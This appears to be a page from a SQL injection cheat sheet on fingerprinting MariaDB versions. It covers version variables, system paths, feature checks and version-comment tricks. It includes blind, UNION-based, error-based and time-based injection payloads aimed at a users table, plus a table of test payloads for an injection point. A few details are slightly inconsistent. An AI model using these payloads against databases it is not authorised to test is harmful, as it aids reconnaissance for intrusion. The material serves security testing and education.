---
title: Testing Version
description: Techniques for determining MariaDB version information
category: Information Gathering
order: 4
tags: ["version", "reconnaissance"]
lastUpdated: 2025-12-18
---

## Basic Version Queries

You can determine the MariaDB version using these variables:

```sql
SELECT VERSION()
SELECT @@VERSION
SELECT @@GLOBAL.VERSION
SELECT @@version_comment
```

All three version variables return identical values. The version string always includes "MariaDB":

```sql
-- Example output: 10.6.20-MariaDB or 11.4.2-MariaDB-1:11.4.2+maria~ubu2404
SELECT VERSION()
```

**Note:** MariaDB versions start with 10.x or 11.x, so the first character is always `1`.

## Identifying MariaDB vs MySQL

MariaDB's version string always contains "MariaDB":

```sql
-- Check if running MariaDB
SELECT IF(@@version LIKE '%MariaDB%', 'MariaDB', 'MySQL') AS db_type

-- Version format: major.minor.patch-MariaDB
SELECT VERSION()
-- Example: 10.6.20-MariaDB
```

## Version Parsing

Extract individual version components:

```sql
-- Extract major version number
SELECT SUBSTRING_INDEX(VERSION(), '.', 1) AS major
-- Returns: 10 or 11

-- Extract minor version number
SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(VERSION(), '.', 2), '.', -1) AS minor

-- Extract all parts
SELECT
  SUBSTRING_INDEX(VERSION(), '.', 1) AS major,
  SUBSTRING_INDEX(SUBSTRING_INDEX(VERSION(), '.', 2), '.', -1) AS minor,
  SUBSTRING_INDEX(SUBSTRING_INDEX(SUBSTRING_INDEX(VERSION(), '-', 1), '.', 3), '.', -1) AS patch
```

## Version Extraction in Injection Context

### Using String Functions

```sql
-- MID() extracts characters (useful for blind injection)
SELECT * FROM users WHERE id = 1 AND MID(VERSION(),1,1) = '1'
-- Returns results because MariaDB version starts with '1' (10.x or 11.x)

-- SUBSTRING() extracts first two characters
SELECT SUBSTRING(VERSION(),1,2) AS first_chars
-- Returns: 10 or 11

-- LEFT() extracts major.minor
SELECT LEFT(VERSION(),5) AS major_minor
-- Returns: 10.6. or 11.4.
```

### UNION-Based Extraction

```sql
-- Extract version via UNION
' UNION SELECT 1, VERSION() -- -

-- Full example
SELECT id, username FROM users WHERE id = 1 UNION SELECT 999, VERSION()
```

### Error-Based Extraction

```sql
-- Force error with version in error message
SELECT CAST(VERSION() AS UNSIGNED)
-- MariaDB error messages may include version context
```

### Boolean-Based Detection

```sql
-- Check if version is 10.x or 11.x
SELECT IF(SUBSTRING(VERSION(),1,2) IN ('10','11'), 1, 0) AS is_mariadb

-- Blind injection version check
SELECT * FROM users WHERE id = 1 AND SUBSTRING(VERSION(),1,2) = '10'
```

### Concatenating Version into Output

```sql
SELECT CONCAT('DB: ', VERSION()) AS info
-- Returns: DB: 10.6.20-MariaDB
```

## System Variables for Version Info

```sql
-- Full version string
SELECT @@version

-- Operating system the server was compiled on
SELECT @@version_compile_os
-- Example: Linux, debian-linux-gnu

-- Machine architecture
SELECT @@version_compile_machine
-- Example: x86_64, aarch64

-- Installation path
SELECT @@basedir
-- Example: /usr

-- Data directory path
SELECT @@datadir
-- Example: /var/lib/mysql/
```

## Feature Availability Detection

Test for features available in specific MariaDB versions:

```sql
-- SLEEP() is available (useful for time-based injection)
SELECT SLEEP(0)

-- GROUP_CONCAT() is available
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = DATABASE()

-- information_schema is accessible (MariaDB 5.0+)
SELECT COUNT(*) FROM information_schema.tables

-- JSON functions (MariaDB 10.2+)
SELECT JSON_EXTRACT('{"a":1}', '$.a')
```

> **Note:** See [Timing](/mariadb/timing) for time-based blind version detection techniques.

## Using Version-Specific Code

MySQL/MariaDB supports version comments that execute only if the version matches:

```sql
/*!VERSION code */
```

### How It Works

- `/*!50000 code */` - Executes if version >= 5.0.0
- `/*!50700 code */` - Executes if version >= 5.7.0
- Higher version number = code only runs on newer versions
- If current version is lower, the content is treated as a comment

### Examples

```sql
-- Executes on MariaDB (MySQL 5.0+ compatible)
SELECT /*!50000 1 AS executed, */ 'test' AS result

-- Test for MySQL 5.7+ features
SELECT /*!50700 JSON_EXTRACT('{"a":1}', '$.a') AS json_val,*/ 1 AS fallback

-- Version detection via error/success
SELECT 1 /*!99999 invalid_sql_here */
-- Higher version = content is comment = query succeeds

-- Nested version comments (database-specific behavior)
SELECT /*!50000 /*!50000 1 */ */ AS val
```

### Injection Point Detection

Given the query:

```sql
SELECT * FROM Users limit 1,{INJECTION POINT};
```

| Test Payload        | Result                                           |
| ------------------- | ------------------------------------------------ |
| `1 /*!50094eaea*/;` | False - version is >= 5.00.94 (comment executes) |
| `1 /*!50096eaea*/;` | True - version is < 5.00.96 (comment is ignored) |
| `1 /*!50095eaea*/;` | False - version is >= 5.00.95 (comment executes) |

## MariaDB-Specific Version Comments

MariaDB supports its own version comment syntax using the `M` prefix:

```sql
/*!MXXXXXX code */
```

Where XXXXXX is: `major*10000 + minor*100 + patch`

### Examples

```sql
-- MariaDB 10.1.6+ specific code
SELECT 'test' /*!M100106 AS mariadb_only */

-- MariaDB 10.2.0+ specific code
SELECT 1 /*!M100200 AS version_10_2_plus */
```

This is useful when you want code to run **only on MariaDB** and not MySQL.

### Version Number Calculation

| MariaDB Version | Comment Code |
| --------------- | ------------ |
| 10.1.6          | M100106      |
| 10.2.0          | M100200      |
| 10.6.20         | M100620      |
| 11.4.2          | M110402      |

## Notes

- MariaDB reports as MySQL 5.5.x compatible for standard version comments
- The `M` prefix version comments are MariaDB-specific and won't work on MySQL
- Version detection is useful when you can't add more SQL due to injection point position
- For more information, see the MariaDB-specific code section
